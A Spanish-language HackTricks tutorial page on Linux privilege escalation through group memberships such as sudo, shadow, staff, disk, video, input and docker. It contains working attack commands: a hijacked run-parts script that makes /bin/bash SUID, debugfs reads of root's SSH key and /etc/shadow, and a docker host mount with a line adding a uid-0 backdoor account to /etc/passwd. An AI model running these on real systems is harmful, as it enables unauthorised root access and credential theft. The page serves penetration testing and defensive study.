# Grupos interesantes - Privesc en Linux

{{#include ../../../banners/hacktricks-training.md}}

## Grupos de sudo/administración

### **PE - Método 1**

**A veces**, la política **/etc/sudoers** de un sistema (o un archivo incluido desde ella) contiene entradas como estas:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Esto significa que cualquier usuario que coincida con cualquiera de las entradas puede ejecutar cualquier comando como cualquier usuario de destino mediante `sudo` (sujeto al resto de la política).<sup>[[3]](#references)</sup>

Si este es el caso, para **convertirte en root solo tienes que ejecutar**:

```
sudo su
```

Si `sudo -l` permite ejecutar `adduser` con restricciones y solo un nombre de usuario, comprueba si crea un grupo principal con el mismo nombre cuando este aún no existe. Una cuenta nueva en ese grupo puede obtener privilegios si la política efectiva de sudoers ya se los concede a `%group`; verifica tanto el comportamiento de creación del grupo como la regla del grupo antes de considerar esto una vía de escalada. Crear una cuenta modifica el sistema, así que inspecciona primero la política.

### PE - Method 2

Busca todos los binarios suid y comprueba si está el binario **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Si **pkexec es un binario SUID**, solo puede ejecutar un programa como otro usuario cuando polkit autoriza la acción solicitada; el bit SUID por sí solo no garantiza acceso a root. Comprueba la política instalada y la autorización de la sesión objetivo en lugar de asumir que pertenecer a **sudo** o **admin** es suficiente.<sup>[[4]](#references)[[5]](#references)</sup>

Para la ruta independiente de [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), primero verifica que `pkexec` sea un archivo ejecutable **SUID propiedad de root**. Un binario instalado sin ese bit no es la escalada SUID local descrita en el aviso. La cadena de versión upstream es solo un indicio: las distribuciones pueden [aplicar el fix a versiones anteriores del paquete](https://ubuntu.com/security/CVE-2021-4034), así que comprueba el paquete del proveedor instalado y las mitigaciones antes de considerarlo vulnerable.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) es una ruta distinta de polkit: una condición de carrera de autorización de D-Bus, no un fallo de SUID de `pkexec`. Revisa el paquete polkit del proveedor instalado y si una acción de D-Bus privilegiada accesible puede realizar un cambio útil; una vía de creación de cuentas también necesita un servicio adecuado, como AccountsService, y el acceso a sudo de cualquier grupo nuevo depende de la política sudo efectiva. Una versión de polkit o un servicio instalado son solo indicios, especialmente cuando los proveedores [aplican fixes](https://access.redhat.com/security/cve/cve-2021-3560). La enumeración pasiva no debe activar la condición de carrera.

En las distribuciones que todavía usan el backend Local Authority antiguo, inspecciona sus reglas de grupo con:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Los nombres de grupo relevantes y sus valores predeterminados varían según la distribución; un grupo solo es útil aquí si la política local lo menciona.<sup>[[5]](#references)</sup>

Para **convertirte en root, puedes ejecutar**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Si intentas ejecutar **pkexec** y obtienes este **error**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

En una sesión SSH sin un agente de autenticación registrado, `pkexec` puede fallar con este error aunque la política permitiría la acción; polkit documenta `pkttyagent` como un agente de autenticación de texto para sesiones que no son de escritorio. El comportamiento exacto depende de la versión y la distribución, así que verifica la política local y la configuración del agente. Una solución alternativa reportada para versiones afectadas de NixOS usa **2 sesiones SSH diferentes**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Una ACL que deniega a una cuenta el acceso a `su` se aplica a ese ejecutable, no a todas las vías para realizar una acción autorizada por un administrador. Si las credenciales de un administrador quedan expuestas por otra vía, revisa si la política de polkit efectiva permite una acción independiente, como iniciar un servicio transitorio mediante `systemd-run`, qué identidad acepta el agente de autenticación y qué identidad usaría el servicio resultante. [Polkit distingue entre la autenticación como propietario de la sesión y como administrador](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), mientras que [systemd-run puede solicitar un servicio transitorio al gestor del sistema](https://systemd.io/CONTROL_GROUP_INTERFACE/). Una entrada del historial, un comando instalado o un archivo de política legible, por sí solos, no demuestran que exista autorización ni que las credenciales sean válidas; una revisión pasiva no debe enviar credenciales ni iniciar una unidad.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Grupo wheel

A veces, una política de sudoers también puede contener esta entrada:

```
%wheel	ALL=(ALL:ALL) ALL
```

Esto significa que cualquier usuario que coincida con la entrada puede ejecutar cualquier comando como cualquier usuario de destino mediante sudo (sujeto al resto de la política).<sup>[[3]](#references)</sup>

Si este es el caso, para **obtener root solo tienes que ejecutar**:

```
sudo su
```

## Grupo shadow

En los sistemas cuyos permisos lo permitan, los usuarios del grupo **shadow** pueden **leer** **/etc/shadow**; verifica los permisos y las ACL reales en el objetivo:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Así que lee el archivo e intenta **crackear algunos hashes**.

Matiz rápido sobre el estado de bloqueo al analizar hashes:
- Las entradas con `!` o `*` generalmente no permiten inicios de sesión interactivos con contraseña.
- `!hash` significa que la contraseña estaba bloqueada; los caracteres restantes representan el campo de contraseña antes de bloquearla.
- Un campo que contiene `*` no es un hash válido de `crypt(3)` e impide el inicio de sesión con contraseña de UNIX; no deduzcas de esto si se había establecido una contraseña.
Esto resulta útil para clasificar cuentas incluso cuando el inicio de sesión directo está bloqueado.<sup>[[6]](#references)</sup>

## Grupo staff

**staff**: Permite a los usuarios añadir modificaciones locales al sistema (`/usr/local`) sin necesitar privilegios de root (ten en cuenta que los ejecutables de `/usr/local/bin` están en la variable PATH de cualquier usuario y pueden «reemplazar» los ejecutables de `/bin` y `/usr/bin` con el mismo nombre). Compara este grupo con «adm», que está más relacionado con la supervisión y la seguridad.<sup>[[2]](#references)[[7]](#references)</sup>

En las configuraciones de Debian donde `/usr/local/bin` precede a `/usr/bin` en `PATH` (como en los ejemplos siguientes), un comando sin ruta explícita ejecuta primero la copia de `/usr/local/bin`; confirma el `PATH` efectivo en el objetivo.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Si un proceso privilegiado resuelve un comando sin ruta mediante un `/usr/local/bin` que permite escritura, reemplazar ese comando puede ejecutarse con los privilegios del proceso; confirma la ruta real y el desencadenante antes de probarlo.

En sistemas Ubuntu, `pam_motd` ejecuta scripts ejecutables mediante `run-parts --lsbsysinit` como root al iniciar sesión; los trabajos de cron también pueden usar `run-parts`, pero esto depende de la distribución y la configuración.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

En un nuevo inicio de sesión SSH, `pspy` puede ayudar a confirmar si esta ruta se invoca realmente en el objetivo; puede observar las líneas de comandos de los procesos sin ser root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Group

La pertenencia al grupo **disk** puede otorgar acceso raw a dispositivos de bloques y suele estar **cerca del acceso root**; Debian lo describe como mayormente equivalente a root, pero verifica los permisos reales de los dispositivos y la disposición del almacenamiento en el objetivo.<sup>[[7]](#references)</sup>

Las rutas de dispositivos comunes incluyen `/dev/sd*`, pero NVMe y otras disposiciones de almacenamiento usan nombres diferentes.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` opera en sistemas de archivos ext2/ext3/ext4; rutas como `/root` y `/etc/shadow` mencionadas arriba son archivos dentro del sistema de archivos abierto, mientras que el segundo argumento de `dump` es una ruta de salida en el sistema de archivos nativo.<sup>[[8]](#references)</sup> Por ejemplo, esto extrae `/tmp/asd1.txt` del sistema de archivos abierto y lo guarda como `/tmp/asd2.txt` en el sistema de archivos nativo:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

La opción `-w` abre el sistema de archivos en modo de lectura y escritura, y el comando `write` copia un archivo nativo al sistema de archivos abierto. Evita usarlo en un sistema de archivos activo montado, ya que las ediciones directas pueden corromperlo; cuando sea posible, trabaja a partir de una imagen sin conexión.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Grupo video

Con el comando `w` puedes encontrar **quién tiene sesión iniciada en el sistema** y mostrará un resultado como el siguiente.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

La entrada **tty1** identifica la primera consola virtual de Linux; por sí sola, no demuestra que haya un usuario físicamente presente en la máquina, especialmente en contenedores u otros entornos.<sup>[[21]](#references)</sup>

En los sistemas que exponen un dispositivo framebuffer legible, pertenecer al grupo **video** puede otorgar acceso a ese dispositivo. La interfaz framebuffer de Linux documenta `/dev/fb0` como un dispositivo de memoria legible que se puede copiar para obtener una captura de pantalla; la ruta `/sys/class/graphics/fb0/virtual_size` solo está disponible cuando existe ese atributo de fbdev en sysfs, así que compruébalo primero en el sistema de destino.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Si la versión instalada de **GIMP** incluye un importador de datos sin procesar, abre **`screen.raw`** con ese importador; la compatibilidad y los controles varían según la versión y el plug-in.<sup>[[22]](#references)</sup>

![Grupo Disk - Grupo Video: Para abrir la imagen sin procesar, puedes usar GIMP, seleccionar el archivo screen.raw y elegir Raw image data como tipo de archivo](<../../../images/image (463).png>)

Configura el ancho y el alto de la imagen para que coincidan con la geometría del framebuffer; prueba los formatos de píxel/Tipos de imagen disponibles hasta que el resultado sea legible.<sup>[[9]](#references)</sup>

![Grupo Disk - Grupo Video: Luego modifica el ancho y el alto para que coincidan con los usados en la pantalla y prueba distintos Tipos de imagen (y selecciona el que muestre mejor la pantalla)](<../../../images/image (317).png>)

## Grupo input

En los sistemas que permiten que el grupo `input` tenga acceso de lectura a los dispositivos de eventos del teclado, un miembro puede observar las pulsaciones de teclas sin procesar de ese dispositivo. Primero comprueba los permisos y las ACL reales: una sesión local activa puede obtener acceso mediante una ACL `uaccess`, y el nombre del grupo por sí solo no garantiza el acceso.<sup>[[23]](#references)[[24]](#references)</sup>

Busca el controlador `eventX` del teclado, confirma que la cuenta actual pueda leer su nodo y luego monitorea una prueba breve autorizada con `evtest`. **No** uses `--grab`: obtiene acceso exclusivo y puede impedir que otras aplicaciones reciban la entrada.<sup>[[25]](#references)[[26]](#references)</sup>

```bash
id -nG
cat /proc/bus/input/devices            # Match the keyboard name with its eventX handler
ls -l /dev/input/by-id/*event-kbd      # If persistent keyboard links exist
getfacl /dev/input/eventX             # Check effective group/seat ACL access
evtest /dev/input/eventX              # Stop with Ctrl-C after the test
```

`EV_KEY` informa códigos de tecla, no texto ya formado: el valor `1` indica una pulsación, `0` una liberación y `2` una repetición. Esto puede revelar las teclas escritas en otra sesión con ese teclado físico, incluidas credenciales, pero no proporciona acceso root por sí solo. Un compositor de escritorio no anula el acceso al nodo de dispositivo sin procesar.<sup>[[25]](#references)</sup>

Para las comprobaciones más amplias de identidad y sesión, consulta [usuarios y sesiones](../user-and-session-triage.md).

## Grupo root

Pertenecer al grupo **root** no proporciona el UID de root, pero los archivos con permisos de escritura para el grupo y propiedad de `root` pueden ser interesantes si los usan servicios o bibliotecas con privilegios. Verifica los permisos reales del archivo y cómo se usa antes de considerarlo una vía de escalada de privilegios.

**Comprueba qué archivos pueden modificar los miembros de root**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

La pertenencia al grupo `docker` otorga acceso de nivel root al daemon de Docker en instalaciones rootful estándar. Como los bind mounts son de lectura y escritura de forma predeterminada, un usuario que pueda controlar ese daemon puede montar `/` del host en un contenedor y modificar archivos del host; esto, en la práctica, otorga acceso root en el host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

La pertenencia al grupo puede no estar sincronizada entre `/etc/group`, `/etc/gshadow` y el token del proceso actual. Si un usuario no aparece en `id -nG`, pero `newgrp docker` funciona, comprueba el grupo que muestra `id` en el nuevo shell y verifica si el socket de Docker realmente permite escritura y sirve a un daemon rootful. El nombre del grupo por sí solo no demuestra que se tenga control del host. Limita la duración de cualquier sondeo automatizado de `newgrp` para que una solicitud de contraseña no detenga la enumeración.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Finalmente, si no te gusta ninguna de las sugerencias anteriores o no funcionan por alguna razón (¿firewall de la API de Docker?), siempre puedes intentar **ejecutar un contenedor privilegiado y escapar de él**, como se explica aquí:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Si tienes permisos de escritura sobre el socket de Docker, lee [**esta publicación sobre cómo escalar privilegios abusando del socket de Docker**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Grupo lxc/lxd

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Grupo Adm

Por lo general, los **miembros** del grupo **`adm`** tienen permisos para **leer archivos de registro** ubicados dentro de _/var/log/_.\
Por lo tanto, si has comprometido a un usuario de este grupo, definitivamente deberías **revisar los registros**.<sup>[[7]](#references)</sup>

## Grupos Backup / Operator / lp / Mail

Estos grupos tienen significados específicos según el servicio y la distribución. Debian documenta `backup` para las tareas delegadas de copia de seguridad/restauración, `lp` para los demonios de impresoras y `mail` para `/var/mail`; por eso, comprueba los permisos locales antes de considerar la pertenencia al grupo una vía para escalar privilegios.<sup>[[7]](#references)</sup>

A menudo son vectores de **descubrimiento de credenciales**, más que vías directas a root:
- **backup**: puede exponer archivos comprimidos con configuraciones, claves, volcados de bases de datos o tokens.
- **operator**: acceso operativo específico de la plataforma que puede filtrar datos sensibles en tiempo de ejecución.
- **lp**: las colas y los directorios de impresión pueden contener documentos.
- **mail**: los directorios de correo pueden exponer enlaces de restablecimiento, OTP y credenciales internas.

Considera la pertenencia a estos grupos como un hallazgo de alto valor por exposición de datos y busca reutilización de contraseñas/tokens.

## Grupo Auth

En OpenBSD, cuando S/Key está configurado, `/etc/skey` pertenece a `root:auth` y se requiere el grupo `auth` para acceder a sus registros; los registros de YubiKey se almacenan en `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Una configuración vulnerable de OpenBSD 6.6 con S/Key o YubiKey habilitado permitía a usuarios locales con privilegios `auth` convertirse en root; Qualys documenta los requisitos previos y la cadena de explotación, y el PoC enlazado la implementa.<sup>[[18]](#references)[[19]](#references)</sup>



## References

- [1] [Autenticación de pkexec/pkttyagent sin una sesión gráfica (incidencia n.º 18012 de NixOS)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Grupos del sistema - Wiki de Debian](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — páginas de manual de Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Manual de referencia de polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Manual de referencia de polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — página del manual de Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Manual de seguridad de Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — página del manual de Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [El dispositivo de framebuffer — documentación del kernel de Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — páginas de manual de Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — páginas de manual de Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — monitorización de procesos Linux sin privilegios](https://github.com/DominicBreuker/pspy)
- [13] [Seguridad de Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Administrar Docker como usuario sin privilegios de root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Ejecución de contenedores — Documentación de Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — páginas de manual de OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — páginas de manual de OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Vulnerabilidades de autenticación en OpenBSD — aviso de seguridad de Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC de exploit local](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — página del manual de Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Dispositivos asignados de Linux (versión 4.x o posterior)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Importación y exportación de imágenes — Documentación de GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
- [23] [Guía sobre permisos del dispositivo beep — Debian Sources](https://sources.debian.org/src/beep/1.4.9-1/PERMISSIONS.md)
- [24] [sd-login — manual de systemd](https://freedesktop.org/software/systemd/man/latest/sd-login.html)
- [25] [Códigos de eventos de entrada — documentación del kernel de Linux](https://docs.kernel.org/5.18/input/event-codes.html)
- [26] [evtest(1) — páginas de manual de Debian](https://manpages.debian.org/bookworm/evtest/evtest.1.en.html)
{{#include ../../../banners/hacktricks-training.md}}
